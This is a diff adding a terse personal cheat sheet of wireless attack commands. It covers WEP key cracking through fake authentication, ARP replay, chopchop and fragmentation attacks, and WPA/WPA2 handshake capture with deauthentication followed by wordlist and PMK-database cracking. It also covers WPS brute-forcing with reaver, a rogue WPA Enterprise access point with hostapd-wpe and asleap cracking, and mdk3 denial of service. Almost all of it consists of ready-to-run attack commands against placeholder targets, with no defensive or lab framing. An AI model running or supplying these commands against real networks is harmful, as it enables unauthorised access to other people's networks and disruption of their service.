@@ -1,0 +1,98 @@
+list Interface: 
+	airmon-ng
+enable monitor mode 1st method:
+	airmon-ng start [Interface]
+	out> monitor mode enabled / monitor mode enabled on [new interface]
+disable monitor mode: 
+	airmon-ng stop [interface]
+	
+2nd method: 
+	ifconfig wlan0 down
+	iwconfig wlan0 mode monitor
+	ifconfig wlan0 up
+	
+3rd method: 
+	ifconfig wlan0 down
+	airmon-ng check kill //network manager stops(to start - service network manager start)
+	airmon-ng start wlan0
+	
+	
+wep
+	aircrack-ng [xyz-01.cap]
+	(more data = more chance to get key)
+	for idle method1: 
+	
+		aireplay-ng --fakeauth 0(means once) -a [target mac] -h [your mac] interface > "AUTH" become OPN
+		aireplay-ng --arpreplay -b [our mac] -h [target mac] interface  > share data
+		
+		method2:
+		do fakeauth
+		aireplay-ng --chopchop -b [target mac] -h [your mac] [interface] > capture packet and determine key stream
+		packetforge-ng -0 -a [target mac] -h [your mac] -k 255.255.255.255 -l 255.255.255.255 -y xyz.xor -w chopchopxyz
+		fakeauth again
+		aireplay-ng -2 -r chopchopxyz [interface]
+		
+		method3:
+		do fakeauth
+		aireplay-ng --fragment -b [target mac] -h [your mac] [interface] > obtain PRGA
+		packetforge-ng -0 -a [target mac] -h [your mac] -k 255.255.255.255 -l 255.255.255.255 -y xyz.xor -w chop-out > forge a new packet
+		aireplay-ng -2 -r chop-out [interface] > inject forged packet into traffic to generate new IV's
+		
+		for SKA:
+		aireplay-ng --arpreplay -b [target mac] -h [client mac] [interface] > this method works both on normal web networks and ska
+		
+wpa/wpa2
+	
+	sniffing:
+	airodump-ng wlan0
+	airodump-ng --channel [number] --bssid [bssid] --write [file name] Interface
+
+	Deauthentication attack:
+	airodump-ng --channel [number] --bssid [bssid] Interface
+	aireplay-ng --deauth [frames] -a [bssid] -c [station] -D Interface
+	
+	
+	word list using crunch
+	
+		crunch 4(min length) 6(max length) [characters] -o xyz
+	
+	aircrack:
+		
+		aircrack-ng [handshake file] -w [wordlist]
+		
+	optimized:
+		progress+disk space:
+		crunch 8 9 | john --stdin --session=sessionxyz --stdout | aircrack-ng -b [target bssid] -w - [handshake file]
+		crunch 8 9 | john --restore=sessionxyz | aircrack-ng -b [target bssid] -w - [handshake file]
+		time:
+		(create db and generate PMK before deauth)
+		airolib-ng [db_name] --import passwd [dictionary] > Create a database and import wordlist
+		airolib-ng [db_name] --import essid [essid-file] > Import target ESSID
+		airolib-ng [db_name] --batch > Compute PMK for the wordlist
+		aircrack-ng -r [db_name] [handshake_file] > Crack the key using the PMK database
+		
+			
+	wps:
+		wash -i [interface] > scan for WPS enabled APs
+		reaver -i [interface] -b [TARGET AP MAC] -c [TARGET CHANNEL] -i [interface] > bruteforce WPS
+		
+WPA Enterprise
+		create a fake access point
+		
+		apt-get update
+		apt-get install hostapd-wpe
+		leafpad /etc/hostapd-wpe/hostapd-wpe.conf
+		modify interface, ssid
+		service network-manager stop
+		hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf > run WPA Enterprise
+		
+		crack password
+		
+		asleap -C [challenge] -R [response] -W [passxyz]
+
+802.11 weak exploit
+		
+		mdk3 <interface> <test_mode> [test_options]
+	eg: dos mdk3 wlan0 a(dos) -a [target mac] -m(use only valid mac)
+	
+
